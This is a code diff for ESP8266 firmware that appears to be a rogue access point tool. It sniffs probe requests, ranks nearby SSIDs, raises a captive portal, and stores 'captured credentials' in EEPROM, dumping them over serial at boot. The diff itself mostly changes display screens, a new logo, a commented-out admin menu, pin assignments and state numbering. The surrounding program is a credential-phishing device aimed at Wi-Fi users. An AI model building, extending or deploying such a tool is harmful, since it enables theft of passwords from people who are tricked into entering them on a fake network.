@@ -7,16 +7,13 @@ extern "C" {
 #include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
 #include <ClickButton.h>
 #include <WiFiClient.h>
-//#include <ESP8266WebServer.h>
 #include <DNSServer.h>
 #include <EEPROM.h>
 #include <Hash.h>
 #include <ESPAsyncTCP.h>
 #include <ESPAsyncWebServer.h>
 #include <SPIFFSEditor.h>
-
-/*#include "index_html.h"
-#include "l_svg.h"*/
+#include "logo.h"
 
 /* ================================
   Constant Definitions
@@ -30,8 +27,9 @@ extern "C" {
 #define SUBTYPE_PROBE_REQUEST 0x04
 #define SUBTYPE_BEACON        0x08
 
-#define STATE0_DURATION 10000
-#define STATE2_DURATION  5000
+#define STATE0_DURATION  2000
+#define STATE1_DURATION 10000
+#define STATE3_DURATION  5000
 
 
 /*=====================================================
@@ -95,22 +93,22 @@ int previousCaptures = 0;
 
 struct credentials capturedCredentials[100];
 
-const int LEDpin = D0;
+const int LEDpin = 2; //GPIO2 D0?, different on each board? use GPIO13 in final
 
 int numberOfInterrupts = 0;
 volatile byte interruptCounter = 0;
-const int interruptPin = D1;
+const int interruptPin = 5; //GPIO5 D1
 ClickButton selectButton(interruptPin, LOW, CLICKBTN_PULLUP);
 
 int numberOfInterrupts2 = 0;
 volatile byte interrupt2Counter = 0;
-const int interrupt2Pin = D2;
+const int interrupt2Pin = 4; //GPIO4 D2
 ClickButton updownButton(interrupt2Pin, LOW, CLICKBTN_PULLUP);
 
 long timeOfLastClick = 0;
 
 typedef void (*Screen)(void);
-SSD1306  display(0x3c, D5, D6);
+SSD1306  display(0x3c, 14, 12); //GPIO14 12 D5, D6
 int screenState = 0;
 long timeOfLastModeSwitch = 0;
 
@@ -277,32 +275,27 @@ void SSIDsort(){
   Screen states
 =====================================================*/
 
+static void ICACHE_FLASH_ATTR displayLogo() {
+    // see http://blog.squix.org/2015/05/esp8266-nodemcu-how-to-create-xbm.html
+    // on how to create xbm files
+    display.drawXbm(15, 0, logo_width, logo_height, logo_bits);
+}
+
 String scan = "Scanning";
 static void ICACHE_FLASH_ATTR displayScanning() {
 
-  int progress = ((millis()*100)/STATE0_DURATION);
+  int progress = (((millis()-timeOfLastModeSwitch)*100)/STATE1_DURATION);
 
   // draw the progress bar
   display.drawProgressBar(0, 32, 120, 10, progress);
 
-  // draw the percentage as String
-  display.setTextAlignment(TEXT_ALIGN_CENTER);
-  //display.drawString(64, 15, String(progress) + "%");
-
   display.setTextAlignment(TEXT_ALIGN_LEFT);
 
-  /*if (progress%10 == 0){
-    if(progress%30 == 0){
-      scan.remove(9, 2);
-    }else{
-      scan += ".";
-    }
-  }*/
   display.drawString(41, 5, scan);
 }
 
 static void ICACHE_FLASH_ATTR displaySSIDs() {
-  // setup table
+  // setup SSID table
   display.setTextAlignment(TEXT_ALIGN_LEFT);
   display.drawString(0, 0, "SSID");
   display.drawString(90, 0, "uniques");
@@ -360,16 +353,22 @@ static void ICACHE_FLASH_ATTR displayKEYcapture(){
 }
 
 static void ICACHE_FLASH_ATTR displayTimeout(){
-  display.setTextAlignment(TEXT_ALIGN_CENTER);
-  //display.drawString(64, 0, "Entering deep sleep");
   display.clear();
+}
+
+static void ICACHE_FLASH_ATTR displayAdmin(){
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  display.drawString(64, 0, "You are now sudoed");
+  display.drawString(64, 10, "Clear EEPROM");
+  display.drawString(64, 20, "Set Timeout");
+  //display.drawString(64, 10, "View Credentials");
+  display.drawRect(15, (numberOfInterrupts2+1)*10, 94, 12);
 }
 
 static void ICACHE_FLASH_ATTR screenTimeout( long timeout ){
   if(millis() - timeOfLastModeSwitch > timeout){
-    if (timeOfLastClick == 0 || millis() - timeOfLastClick > timeout){
-      screenState = 4;
-      Serial.println("Outta time");
+    if (timeOfLastClick == 0 || millis() - timeOfLastClick > timeout || WiFi.softAPgetStationNum() > 0){
+      screenState = 5;
     }
   }
 }
@@ -402,7 +401,7 @@ void channelHop()
 #define DISABLE 0
 #define ENABLE  1
 
-Screen screens[] = { displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture, displayTimeout};
+Screen screens[] = { displayLogo, displayScanning, displaySSIDs, displayAPsetup, displayKEYcapture, displayTimeout, displayAdmin};
 //int demoLength = (sizeof(screens) / sizeof(Screen));
 
 void setup() {
@@ -440,11 +439,8 @@ void setup() {
     display.flipScreenVertically();
     display.setFont(ArialMT_Plain_10);
 
-    //selectButton.Update();
-    //if (selectButton.clicks >= 1){
-        //clearEEPROM(); //uncomment to clear stored credentials
-    //}
-    // Dump previously captured credentials
+    //clearEEPROM(); //uncomment to clear stored credentials
+
     Serial.println();
     Serial.println("Recovered credentials:");
     int i = 0;
@@ -455,14 +451,6 @@ void setup() {
       Serial.println();
       i++;
     }
-
-    /*for( int i = 0 ; i <= 10 ; i++){
-      SSIDlist[i].name = "test"+ String(i);
-      SSIDcount++;
-    }
-
-    return;*/
-
 }
 
 
@@ -491,18 +479,45 @@ void loop() {
     Serial.println(timeOfLastClick);
   }
 
+  //enter admin menu
+  /*if(updownButton.clicks == 1 && selectButton.clicks == 1){
+    //timeOfLastClick = millis();
+    Serial.println("sudo access granted");
+    screenState = 6;
+    numberOfInterrupts2 = 0;
+  }
+
+  if(screenState == 6){
+    if(updownButton.clicks == 1){
+      numberOfInterrupts2++;
+    }
+    if (numberOfInterrupts2 > 3){
+        numberOfInterrupts2 = 0;
+    }
+  }*/
+
   // Clear screen and enter deep sleep
-  if(screenState == 4){
+  if(screenState == 5){
       ESP.deepSleep(0);
   }
 
-  // Escape Scanning screen after 10s
-  if(screenState == 0){
+  if(screenState ==0){
     if ((millis() - timeOfLastModeSwitch > STATE0_DURATION)) {
+
+      screenState = 1;
+      timeOfLastModeSwitch = millis();
+      timeOfLastClick = millis();
+    }
+
+  }
+
+  // Escape Scanning screen after 10s
+  if(screenState == 1){
+    if ((millis() - timeOfLastModeSwitch > STATE1_DURATION)) {
 
       SSIDsort();
 
-      screenState = 1;
+      screenState = 2;
       timeOfLastModeSwitch = millis();
       timeOfLastClick = millis();
 
@@ -514,7 +529,7 @@ void loop() {
   }
 
   // Display SSID list
-  if( screenState == 1){
+  if( screenState == 2){
 
     // 10s Time out on SSID list
     screenTimeout(10000);
@@ -541,7 +556,7 @@ void loop() {
       interruptCounter--;
       numberOfInterrupts++;
 
-      screenState = 2;
+      screenState = 3;
       timeOfLastModeSwitch = millis();
 
       yield();
@@ -551,15 +566,15 @@ void loop() {
   }
 
   // Escape AP Setup screen after 5s
-  if(screenState == 2){
-    if(millis() - timeOfLastModeSwitch > STATE2_DURATION){
-      screenState = 3;
+  if(screenState == 3){
+    if(millis() - timeOfLastModeSwitch > STATE3_DURATION){
+      screenState = 4;
       timeOfLastModeSwitch = millis();
     }
   }
 
   // Display Credential Capture
-  if(screenState == 3){
+  if(screenState == 4){
 
     // 60s timeout on captive portal
     screenTimeout(60000);
